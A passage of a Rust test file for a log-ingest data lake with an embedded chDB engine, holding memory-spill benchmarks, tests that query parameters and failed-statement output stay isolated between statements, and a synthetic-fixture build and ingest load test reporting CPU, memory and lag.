        ("sort_6m_wide", "SELECT sum(cityHash64(k, rn)) AS c FROM (SELECT k, rowNumberInAllBlocks() AS rn FROM (SELECT toString(cityHash64(number)) || repeat('y', 200) AS k FROM numbers(6000000) ORDER BY k DESC))"),
    ];
    let custom = std::env::var("QMB_SPILL_SQL").ok();
    let queries: Vec<(&str, &str)> = match &custom {
        Some(sql) => vec![("custom", sql.as_str())],
        None => queries.to_vec(),
    };
    let threads = std::env::var("QMB_SPILL_THREADS").unwrap_or_else(|_| "3".into());
    for (name, query) in queries {
        // Sort spill is checked per sorting thread (3 here), so its trigger
        // is the cap / (2 x threads); aggregation's is query-wide.
        for (config, cap, spill) in [("no_spill", 10 * GIB, None), ("budget_3gib", budget, Some(budget / 2)), ("cap_256mib", 256 << 20, Some(128 << 20)), ("budget_3gib_sort_64m", budget, Some(192 << 20))] {
            let mut times = Vec::new();
            for _ in 0..3 {
                let settings = match spill {
                    Some(at) => format!("max_bytes_before_external_group_by={at}, max_bytes_before_external_sort={}, max_temporary_data_on_disk_size_for_query={}", at / 3, 16 * GIB),
                    None => "max_bytes_before_external_group_by=0, max_bytes_before_external_sort=0".to_string(),
                };
                let sql = format!("{query} SETTINGS max_threads={threads}, max_memory_usage={cap}, {settings}");
                let started = Instant::now();
                let result = executor.execute_sql(sql, vec![]).await;
                if let Err(error) = result {
                    eprintln!("TIMING {name} {config} FAILED {}", error.to_string().chars().take(160).collect::<String>());
                    break;
                }
                times.push(started.elapsed().as_secs_f64());
            }
            times.sort_by(f64::total_cmp);
            if times.len() == 3 {
                eprintln!("TIMING {name} {config} median_s={:.2} runs={times:?}", times[1]);
            }
        }
    }
}

/// Same as `concurrent_lanes_return_their_own_results`, but every value
/// arrives as a bound query parameter (the engine binds file lists, time
/// fences and lookup arrays that way): each statement must see its own.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
#[ignore = "native: NANO_CHDB_LIBRARY_PATH, NANO_CHDB_LIBRARY_SHA256"]
async fn concurrent_lanes_bind_their_own_parameters() {
    let runtime = NativeChdb::load_verified(
        std::env::var("NANO_CHDB_LIBRARY_PATH").unwrap(),
        &std::env::var("NANO_CHDB_LIBRARY_SHA256").unwrap(),
    ).unwrap();
    std::mem::forget(runtime.clone());
    let lanes = std::env::var("QMB_LANES").ok().and_then(|v| v.parse().ok()).unwrap_or(2);
    let executor = Arc::new(NativeExecutor::start_with_server_memory_limit(runtime, lanes, "params", ExecutorMode::ReadOnly, Some(2 * GIB)).unwrap());
    let mut tasks = Vec::new();
    for worker in 0..4_u64 {
        let executor = executor.clone();
        tasks.push(tokio::spawn(async move {
            let mut wrong = 0;
            for i in 0..300_u64 {
                let rows: u64 = if (worker + i) % 2 == 0 { 50_000 } else { 1 };
                let sql = "SELECT {w:UInt64} AS w, {i:UInt64} AS i, {tag:String} AS tag FROM numbers({n:UInt64}) SETTINGS max_threads=2".to_string();
                let tag = format!("tag-{worker}-{i}");
                let params = vec![("w".into(), worker.to_string()), ("i".into(), i.to_string()),
                    ("tag".into(), tag.clone()), ("n".into(), rows.to_string())];
                let output = executor.execute_sql(sql, params).await.unwrap();
                let text = String::from_utf8_lossy(&output.data);
                let lines = text.lines().count() as u64;
                let foreign = text.lines().filter(|line| !line.contains(&format!("\"{tag}\""))).count();
                if lines != rows || foreign > 0 {
                    wrong += 1;
                    eprintln!("WRONG worker={worker} i={i} want_rows={rows} got_rows={lines} foreign_rows={foreign} first={}",
                        text.lines().find(|line| !line.contains(&format!("\"{tag}\""))).unwrap_or("").chars().take(90).collect::<String>());
                }
            }
            wrong
        }));
    }
    let mut wrong = 0;
    for task in tasks {
        wrong += task.await.unwrap();
    }
    assert_eq!(wrong, 0, "parameters crossed between concurrent lanes");
}

/// A statement that fails part-way through its output (here chDB's
/// `max_result_bytes`, Code 396) must not leave that output behind for the
/// next statement on the same connection.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
#[ignore = "native: NANO_CHDB_LIBRARY_PATH, NANO_CHDB_LIBRARY_SHA256"]
async fn failed_statement_output_does_not_leak_into_the_next() {
    let runtime = NativeChdb::load_verified(
        std::env::var("NANO_CHDB_LIBRARY_PATH").unwrap(),
        &std::env::var("NANO_CHDB_LIBRARY_SHA256").unwrap(),
    ).unwrap();
    std::mem::forget(runtime.clone());
    let executor = NativeExecutor::start_with_server_memory_limit(runtime, 1, "leak", ExecutorMode::ReadOnly, Some(2 * GIB)).unwrap();
    let mut leaks = 0;
    for round in 0..20 {
        let big = executor.execute_sql(
            "SELECT number, repeat('q', 300) AS pad FROM numbers(2000000) SETTINGS max_result_bytes=33554432, max_threads=2".to_string(), vec![]).await;
        let small = executor.execute_sql(format!("SELECT {round} AS round SETTINGS max_threads=1"), vec![]).await.unwrap();
        let text = String::from_utf8_lossy(&small.data);
        let ok = text.trim() == format!("{{\"round\":{round}}}") || text.trim() == format!("{{\"round\":\"{round}\"}}");
        if !ok {
            leaks += 1;
        }
        eprintln!("LEAK round={round} big={} small_bytes={} small_rows={} small_ok={ok}",
            match &big { Ok(o) => format!("ok {} bytes", o.data.len()), Err(e) => format!("err {}", e.to_string().chars().take(80).collect::<String>()) },
            small.data.len(), text.lines().count());
    }
    assert_eq!(leaks, 0, "a failed statement's output leaked into the next statement");
}

/// Lean tier budgets: ingest[T]'s bronze for one tier. `QMB_EPS` rows/s for
/// `QMB_HOURS` h in one object per `QMB_OBJECT_SECONDS` (default 10 s), with
/// a `QMB_BURST_FACTOR`x (default 2) burst from minute `QMB_BURST_AT_MINUTES`
/// for `QMB_BURST_MINUTES`. Writes `sources/bronze/*.parquet` + `plan.json`
/// under `QMB_DIR`; `ingest_load` replays it.
#[tokio::test(flavor = "current_thread")]
#[ignore = "native fixture build: QMB_DIR, QMB_EPS, QMB_HOURS"]
async fn ingest_bronze_build() {
    let root = fixture_dir();
    std::fs::create_dir_all(root.join("sources/bronze")).unwrap();
    let eps: f64 = std::env::var("QMB_EPS").expect("QMB_EPS").parse().unwrap();
    let hours: f64 = std::env::var("QMB_HOURS").expect("QMB_HOURS").parse().unwrap();
    let every = env_u64("QMB_OBJECT_SECONDS", 10) as i64;
    let burst_at = env_u64("QMB_BURST_AT_MINUTES", u64::MAX / 120) as i64 * 60;
    let burst_end = burst_at.saturating_add(env_u64("QMB_BURST_MINUTES", 0) as i64 * 60);
    let factor: f64 = std::env::var("QMB_BURST_FACTOR").ok().and_then(|v| v.parse().ok()).unwrap_or(2.0);
    let seconds = (hours * 3_600.0) as i64;
    let base_ms = chrono::Utc::now().timestamp_millis() / 1_000 * 1_000 - seconds * 1_000 - 600_000;
    let mut objects = Vec::new();
    let mut uid = 0_usize;
    let mut carry = 0.0_f64;
    for sec in (0..seconds).step_by(every as usize) {
        let rate = if (burst_at..burst_end).contains(&sec) { eps * factor } else { eps };
        carry += rate * every as f64;
        let n = carry as usize;
        carry -= n as f64;
        if n == 0 {
            continue;
        }
        let batch = (0..n).map(|k| {
            let i = uid + k;
            let time = chrono::DateTime::from_timestamp_millis(base_ms + sec * 1_000 + (k as i64 * every * 1_000) / n as i64).unwrap().to_rfc3339();
            match i % 10 {
                1 | 4 => network_row(i, &time),
                7 => logon_row(i, &time),
                _ => row(i, &time),
            }
        }).collect::<Vec<_>>();
        uid += n;
        let key = format!("bronze/{sec:07}.parquet");
        write_bronze(&root.join("sources").join(&key), &batch);
        let bytes = std::fs::metadata(root.join("sources").join(&key)).unwrap().len();
        objects.push(json!({"sec": sec + every - 1, "key": key, "rows": n, "bytes": bytes}));
        if objects.len() % 200 == 0 {
            eprintln!("built {} objects, {uid} rows", objects.len());
        }
    }
    std::fs::write(root.join("plan.json"), json!({"eps": eps, "hours": hours, "base_ms": base_ms, "rows": uid,
        "burst": [burst_at, burst_end], "burst_factor": factor, "objects": objects}).to_string()).unwrap();
    eprintln!("RESULT plan rows={uid} objects={}", objects.len());
}

fn process_cpu_usec() -> u64 {
    let mut usage: libc::rusage = unsafe { std::mem::zeroed() };
    // SAFETY: getrusage writes into the provided struct only.
    unsafe { libc::getrusage(libc::RUSAGE_SELF, &mut usage) };
    let us = |t: libc::timeval| t.tv_sec as u64 * 1_000_000 + t.tv_usec as u64;
    us(usage.ru_utime) + us(usage.ru_stime)
}

/// Lean tier budgets: ingest[T] replaying a tier's bronze (`ingest_bronze_build`)
/// configured as `IngestService` configures it for a `QMB_CAP_BYTES` role
/// (dedup window cap and part cache from the budget, v2 keyword block
/// indexes + v3 token counts on, local prevalence DB, default flush policy).
/// `QMB_SPEED=0` (default) replays in simulated time as fast as it can (CPU
/// per simulated second = cores needed at real time; memory incl. the full
/// 6 h dedup window and every hour seal); `QMB_SPEED=1` paces arrival at
/// wall-clock rate so a `CPUQuota` shows as notice lag. Prints per-phase
/// CPU (steady / burst / after), peak anon memory and the worst lag.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
#[ignore = "native load test: QMB_DIR (with plan.json); run under a memory cgroup"]
async fn ingest_load() {
    let _ = tracing_subscriber::fmt().with_max_level(tracing::Level::WARN).try_init();
    let root = fixture_dir();
    let plan: Value = serde_json::from_slice(&std::fs::read(root.join("plan.json")).expect("run ingest_bronze_build first")).unwrap();
    let cap = env_u64("QMB_CAP_BYTES", 4_831_838_208);
    let speed: f64 = std::env::var("QMB_SPEED").ok().and_then(|v| v.parse().ok()).unwrap_or(0.0);
    let eps = plan["eps"].as_f64().unwrap();
    let base_ms = plan["base_ms"].as_i64().unwrap();
    let (burst_at, burst_end) = (plan["burst"][0].as_i64().unwrap(), plan["burst"][1].as_i64().unwrap());
    let objects: Vec<(i64, String, u64)> = plan["objects"].as_array().unwrap().iter()
        .map(|o| (o["sec"].as_i64().unwrap(), o["key"].as_str().unwrap().to_string(), o["bytes"].as_u64().unwrap())).collect();
    let last_sec = objects.last().map_or(0, |o| o.0);
    let limit_sec = env_u64("QMB_SIM_SECONDS", u64::MAX / 2) as i64;
    let run = tempfile::tempdir_in(&root).unwrap();
    let parts = LocalObjectStore::new(run.path().join("parts")).unwrap();
    let sources = LocalObjectStore::new(root.join("sources")).unwrap();
    let spool = SpoolQueue::new(run.path().join("spool"), TENANT).unwrap();
    let signer = signer();
    let mut cfg = IngestConfig::new(TENANT, run.path().join("work"));
    cfg.max_window_uids = nanosiem_lake_worker::part_ingest::dedup::window_cap_for(cap);
    // `cell::cache_bytes_for` for this eps.
    let cache = if eps <= 300.0 { GIB as f64 + (eps - 20.0).max(0.0) / 280.0 * 7.0 * GIB as f64 } else { 8.0 * GIB as f64 + (eps - 300.0) / 900.0 * 22.0 * GIB as f64 };
    cfg.cache_max_bytes = (cache * 0.75) as u64;
    nanosiem_lake_worker::parts::block_index::set_enabled(true);
    nanosiem_lake_worker::parts::token_counts::set_enabled(true);
    eprintln!("ingest_load eps={eps} cap_mib={} window_cap={} cache_mib={} speed={speed} objects={} sim_s={}", cap >> 20,
        cfg.max_window_uids, cfg.cache_max_bytes >> 20, objects.len(), last_sec.min(limit_sec));
    let mut ingestor = Ingestor::open(cfg, &parts, &sources, &spool as &dyn NoticeQueue, &signer, signer.trusted(),
        BronzeIngestEnricher::disabled(), &seed_schema(), base_ms).await.expect("ingest opens");
    let anon_peak = spawn_anon_sampler();
    let open_anon = anon_peak.load(std::sync::atomic::Ordering::Relaxed);
    let started = Instant::now();
    // Phase boundaries (simulated s): steady, burst, after.
    let mut phase_cpu = [0_u64; 4];
    let mut phase_wall = [0_f64; 4];
    let phase_of = |sec: i64| if sec < burst_at { 0 } else if sec < burst_end { 1 } else { 2 };
    let mut phase_start = (0usize, process_cpu_usec(), Instant::now());
    let (mut next, mut rows_delivered, mut max_lag, mut max_buffered) = (0usize, 0_u64, 0_i64, 0usize);
    let mut sec = 0_i64;
    let end_sec = last_sec.min(limit_sec) + 30;
    let mut last_report = 0_i64;
    let mut hwm_by_phase = [0_u64; 4];
    while sec <= end_sec {
        if speed > 0.0 {
            let target = started + Duration::from_secs_f64(sec as f64 / speed);
            let now = Instant::now();
            if target > now {
                tokio::time::sleep(target - now).await;
            } else {
                // Behind: jump the simulated clock to wall time (arrivals do not wait).
                sec = sec.max((started.elapsed().as_secs_f64() * speed) as i64).min(end_sec);
            }
        }
        let phase = phase_of(sec);
        if phase != phase_start.0 {
            phase_cpu[phase_start.0] += process_cpu_usec() - phase_start.1;
            phase_wall[phase_start.0] += phase_start.2.elapsed().as_secs_f64();
            phase_start = (phase, process_cpu_usec(), Instant::now());
        }
        while next < objects.len() && objects[next].0 <= sec && objects[next].0 <= limit_sec {
            let (at, key, bytes) = &objects[next];
            spool.deliver(&SourceNotice { tenant_id: TENANT.into(), key: key.clone(), version: "1".into(), bytes: *bytes,
                sha256: None, edge_sha256: None, notified_at_ms: base_ms + at * 1_000 }).unwrap();
            rows_delivered += plan["objects"][next]["rows"].as_u64().unwrap();
            next += 1;
        }
        ingestor.tick(base_ms + sec * 1_000 + 999).await.expect("ingest tick");
        let h = ingestor.health();
        max_lag = max_lag.max(h.lag_ms);
        max_buffered = max_buffered.max(h.buffered_rows);
        let anon = anon_peak.load(std::sync::atomic::Ordering::Relaxed);
        hwm_by_phase[phase] = hwm_by_phase[phase].max(anon);
        if sec - last_report >= 1_800 {
            last_report = sec;
            eprintln!("t+{sec}s wall={:.0}s delivered={rows_delivered} committed={} window_uids={} live_parts={} backlog={} buffered={} lag_ms={} prevalence_mib={} cache_mib={} anon_peak_mib={} cpu_s={:.0}",
                started.elapsed().as_secs_f64(), h.rows_committed_total, h.window_uids, h.live_parts, h.merge_backlog, h.buffered_rows, h.lag_ms,
                h.prevalence_index_bytes >> 20, h.cache_bytes >> 20, anon >> 20, process_cpu_usec() as f64 / 1e6);
        }
        sec += 1;
    }
    phase_cpu[phase_start.0] += process_cpu_usec() - phase_start.1;
    phase_wall[phase_start.0] += phase_start.2.elapsed().as_secs_f64();
    // Seal: flush and run merges until none are due (the hour seals).
    let seal_cpu = process_cpu_usec();
    let seal_started = Instant::now();
    let mut clock = base_ms + (end_sec + 1) * 1_000;
    ingestor.flush_now(clock).await.expect("flush");
    clock += 11 * 60_000;
    for _ in 0..20_000 {
        let report = ingestor.tick(clock).await.expect("seal tick");
        if report.merges == 0 && ingestor.health().merge_backlog == 0 {
            break;
        }
        clock += 1_000;
    }
    phase_cpu[3] = process_cpu_usec() - seal_cpu;
    phase_wall[3] = seal_started.elapsed().as_secs_f64();
    hwm_by_phase[3] = anon_peak.load(std::sync::atomic::Ordering::Relaxed);
    let h = ingestor.health().clone();
    let sim = |p: usize| match p { 0 => burst_at.min(end_sec).max(0), 1 => (burst_end.min(end_sec) - burst_at.min(end_sec)).max(0), _ => (end_sec - burst_end.min(end_sec)).max(0) } as f64;
    let names = ["steady", "burst", "after"];
    for p in 0..3 {
        if sim(p) > 0.0 {
            eprintln!("RESULT phase={} sim_s={:.0} wall_s={:.1} cpu_s={:.1} cores_per_sim_s={:.3} cores_per_wall_s={:.3} anon_peak_mib={}",
                names[p], sim(p), phase_wall[p], phase_cpu[p] as f64 / 1e6, phase_cpu[p] as f64 / 1e6 / sim(p),
                phase_cpu[p] as f64 / 1e6 / phase_wall[p].max(1e-9), hwm_by_phase[p] >> 20);
        }
    }
    eprintln!("RESULT seal cpu_s={:.1} wall_s={:.1}", phase_cpu[3] as f64 / 1e6, phase_wall[3]);
    eprintln!("RESULT ingest eps={eps} cap_mib={} delivered={rows_delivered} committed={} dup={} window_uids={} live_parts={} by_level={:?} max_lag_ms={max_lag} max_buffered={max_buffered} prevalence_mib={}",
        cap >> 20, h.rows_committed_total, h.duplicates_dropped_total, h.window_uids, h.live_parts, h.live_parts_by_level, h.prevalence_index_bytes >> 20);
    eprintln!("RESULT memory open_anon_mib={} anon_peak_mib={} hwm_mib={} cgroup_peak_mib={:?} cgroup_events={:?} wall_s={:.0} total_cpu_s={:.0}",
        open_anon >> 20, anon_peak.load(std::sync::atomic::Ordering::Relaxed) >> 20, vm_hwm_kib() / 1024,
        cgroup_file("memory.peak").map(|v| v.trim().parse::<u64>().unwrap_or(0) >> 20), cgroup_file("memory.events").map(|v| v.replace('\n', " ")),
        started.elapsed().as_secs_f64(), process_cpu_usec() as f64 / 1e6);
    assert_eq!(h.rows_committed_total + h.duplicates_dropped_total, rows_delivered, "every delivered row is committed");
    // `QMB_KEEP=1`: keep the run's parts as a query fixture (rules_load /
    // concurrent_load read `<run>/parts` + `fixture.json`).
    if std::env::var("QMB_KEEP").is_ok_and(|v| v == "1") {
        drop(ingestor);
        let built_at = chrono::DateTime::from_timestamp_millis(base_ms + end_sec * 1_000).unwrap();
        std::fs::write(run.path().join("fixture.json"), json!({"rows": h.rows_committed_total, "built_at": built_at.to_rfc3339()}).to_string()).unwrap();
        eprintln!("RESULT kept {}", run.keep().display());
    }
}
